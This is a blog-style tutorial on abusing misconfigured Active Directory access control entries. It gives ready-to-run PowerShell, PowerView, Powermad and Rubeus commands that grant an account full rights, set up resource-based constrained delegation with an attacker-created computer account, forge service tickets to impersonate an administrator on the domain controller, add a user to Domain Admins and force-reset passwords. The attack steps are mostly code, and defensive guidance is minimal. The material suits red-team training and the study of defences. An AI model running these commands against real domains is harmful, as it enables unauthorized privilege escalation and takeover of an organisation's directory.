---
title: 'Abusing AD Access Controls'
date: '2019-01-15'
layout: post
tag: [AD, Access Controls]
excerpt: >-
  Abusing Access Control List and Access Control Entries
description: >-
  Abusing Access Control List and Access Control Entries
image: '/images/posts/abusing-ace/abusing-acl.png'
thumb_image: '/images/posts/abusing-ace/abusing-acl.png'
---

# Introduction

Access privileges for resources in Active Directory Domain Services are usually granted through the use of an Access Control Entry (ACE). 

Access Control List entries describe the allowed and denied permissions for a principal in Active Directory against a securable object (user, group, computer, container, organization unit (OU), GPO etc..) DACLs (Active Directory Discretionary Access Control Lists) are lists made of ACEs (Access Control Entries) that identify the users and groups that are allowed or denied access to an object. When we have misconfigured, ACEs can be abused to operate lateral movement or privilege escalation within an AD domain. 

An example of ACEs for the “Domain Admins” securable object can be seen here:

![](/images/posts/abusing-ace/abusing-active-directory-aclace.png)

Active Directory offers a variety of permission types to set up an ACE.  
From an attacker’s point of view, the following permission types are particularly interesting:

- **WriteDACL** – modify the object’s ACEs and give an attacker complete control right over the object 
- **GenericAll** – full rights to the object (add users to a group or reset user’s password) 
- **GenericWrite** – update object’s attributes (i.e. logon script) 
- **WriteOwner** – change object owner to attacker controlled user to take over the object 
- **AllExtendedRights** – the ability to add a user to a group or reset a password 
- **ForceChangePassword** – the ability to change the user’s password 

## WriteDacl

The writeDACL permissions allow an identity to fully control rights over the designated object. 
This means they can modify access control lists (ACL) to gain higher privileges, like becoming a domain administrator or gaining specific user rights.

It’s important to be aware of the risks, especially if someone can modify the ACL of an Active Directory (AD) object and assign permissions that allow them to read and write specific attributes, such as changing an account name or resetting a password.

Abusing writeDACL to a computer object can be used to gain the GenericAll privilege. 
It’s crucial to authenticate to the Domain Controller when running a process as a user without writeDACL rights.

Additionally, using the Powerview module Add-DomainObjectAcl requires creating a PSCredential object first.

```powershell
SecPassword = ConvertTo-SecureString 'Password@1' -AsPlainText -Force 
$Cred = New-Object System.Management.Automation.PSCredential('first.local\\admin.user', $SecPassword) 
Add-DomainObjectAcl -Credential $Cred -TargetIdentity FIRST-DC  -PrincipalIdentity writedacldc.user -Rights All
```

![](/images/posts/abusing-ace/Pasted-image-20231211174126.png)

Once we have granted this privilege, we can execute a resource based constrained delegation attack. 
First, if an attacker does not control an account with an SPN set, 
Powermad can be used to add a new attacker-controlled computer account: 

```powershell
New-MachineAccount -MachineAccount attacker system -Password $(ConvertTo-SecureString 'Password@1' -AsPlainText -Force)
```

![](/images/posts/abusing-ace/Pasted-image-20231211174134.png)

PowerView can be used to retrieve then the security identifier (SID) of the newly created computer account: 

```powershell
$ComputerSid = Get-DomainComputer attacker system -Properties objectsid | Select -Expand objectsid
```

We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE: 

```powershell
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))" 
$SDBytes = New-Object byte[] ($SD.BinaryLength) 
$SD.GetBinaryForm($SDBytes, 0)
```

Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we’re taking over, again using PowerView in this case: 

```powershell
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{‘msds-allowedtoactonbehalfofotheridentity’=$SDBytes}
```

We can then use Rubeus to hash the plaintext password into its RC4_HMAC form 

```powershell
Rubeus.exe hash /password:Password@1
```

![](/images/posts/abusing-ace/rubeus-exe-hash.png)

And the _s4u_ module to get a service ticket for the service name we want to pretend to be an admin for. 
This ticket is injected into memory and in this case grants us access to the file system of the FIRST-DC: 

```powershell
Rubeus.exe s4u /user:attackersystem$ /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /impersonateuser:admin /msdsspn:cifs/FIRST-DC.first.local /ptt
```

![](/images/posts/abusing-ace/rubeus-exe-hash-1.png)

![](/images/posts/abusing-ace/rubeus-exe-hash_.png)

![](/images/posts/abusing-ace/rubeus-exe-s4u.png)

## GenericAll

The GenericAll permission provides write access to all properties (add users to a group or reset the user’s password).
 _The right to read permissions on this object, write all the properties on this object, and perform all validated writes to this object._ 

Example: If the attacker has GenericAll over any target, then he doesn’t have to know the target user’s password. 
He can execute a force password reset using **Set-DomainUserPassword** to a known value.

Using powerview, we will check if our user has GenericAll rights on the Domain Controller (First-DC) 

```powershell
Get-ObjectAcl -SamAccountName first-dc | ?{$_.ActiveDirectoryRights -eq "GenericAll"} 
```

![](/images/posts/abusing-ace/get-objectacl-samaccountname-first-dc.png)

We can see that our user has the GenericAllrights, effectively enabling the user to take over the DC: 
Generic write to a computer object can be used to perform a resource based constrained delegation attack. 
We will use Powermad to add a new attacker-controlled computer account 

```powershell
New-MachineAccount -MachineAccount genallcomp -Password $(ConvertTo-SecureString 'Password!' -AsPlainText -Force)
```

PowerView can be used to retrieve then the security identifier (SID) of the newly created computer account: 

```powershell
$ComputerSid = Get-DomainComputer genallcomp -Properties objectsid | Select -Expand objectsid 
```

We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE: 

```powershell
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))" 
$SDBytes = New-Object byte[] ($SD.BinaryLength) 
$SD.GetBinaryForm($SDBytes, 0)
```

Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we’re taking over, again using PowerView in this case: 

```powershell
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{‘msds-allowedtoactonbehalfofotheridentity’=$SDBytes} 

Rubeus.exe hash /password:Password!
```

![](/images/posts/abusing-ace/rubeus-exe-hash-password.png)

Finally, we can use Rubeus’ _s4u_ module to get a service ticket for the service name we want to “pretend” to be “admin” for. 
This ticket is injected in memory, and in this case grants us access to the file system of the FIRST-DC: 

```powershell
Rubeus.exe s4u /user:genallcomp$ /rc4:FBDCD5041C96DDBD82224270B57F11FC /impersonateuser:admin /msdsspn:cifs/FIRST-DC.first.local /ptt 
```

![](/images/posts/abusing-ace/rubeus-exe-s4u-user-genallcomp.png)

![](/images/posts/abusing-ace/rubeus-exe-s4u-user-genallcomp_.png)

![](/images/posts/abusing-ace/genericwrite.png)


GenericAll / GenericWrite / Write on Computer 

If you have rights you can perform a resource based constrained delegation 

## WriteProperty (Self-Membership)

If our user has WriteProperty right on All objects for the Domain Admin group: 

We can again add ourselves to the Domain Admins group and escalate privileges: 

```powershell
net user gpowrite.user /domain; Add-NetGroupUser -UserName gpowrite.user -GroupName "domain admins" -Domain "first.local"; net user gpowrite.user /domain 
```

![](/images/posts/abusing-ace/gpowrite-user.png)


## ForceChangePassword

If we have ExtendedRight on User-Force-Change-Password object type, we can reset the user’s password without knowing their current password: 

Using PowerView: 

```powershell
Set-DomainUserPassword -Identity gpowrite.user -Verbose 
```

![](/images/posts/abusing-ace/forcechangepassword.png)
